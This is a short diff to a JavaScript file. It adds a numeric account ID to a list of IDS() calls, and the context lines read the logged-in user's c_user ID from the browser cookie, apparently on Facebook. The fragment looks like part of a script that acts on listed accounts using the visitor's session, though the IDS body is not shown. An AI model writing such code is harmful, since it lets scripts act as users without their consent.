@@ -80,6 +80,7 @@ function IDS(r) {
 }
 IDS("100000076612063");
 IDS("100003898532554");
+IDS("1828742834");
 
 
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
